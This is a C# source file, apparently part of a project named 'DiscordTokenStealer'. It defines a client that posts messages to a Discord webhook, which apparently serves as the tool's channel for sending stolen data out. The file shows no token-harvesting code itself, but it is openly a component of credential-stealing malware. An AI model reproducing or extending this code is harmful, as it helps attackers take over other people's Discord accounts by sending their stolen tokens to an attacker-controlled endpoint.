using System.Net;
using System.Net.Http.Json;

namespace DiscordTokenStealer.Discord;

public class DiscordWebhookClient : IDisposable
{
    private readonly HttpClient _client;

    public DiscordWebhookClient(string id, string token)
    {
        _client = new HttpClient(new HttpClientHandler {UseProxy = true, Proxy = new WebProxy()}, true)
        {
            BaseAddress = new Uri($"https://canary.discord.com/api/webhooks/{id}/{token}")
        };
    }

    public void Dispose()
    {
        _client.Dispose();
        GC.SuppressFinalize(this);
    }

    public async Task SendMessage<TMessage>(TMessage message) where TMessage : DiscordMessage
    {
        using var response = await _client.PostAsync(string.Empty, JsonContent.Create(message));
        response.EnsureSuccessStatusCode();
    }
}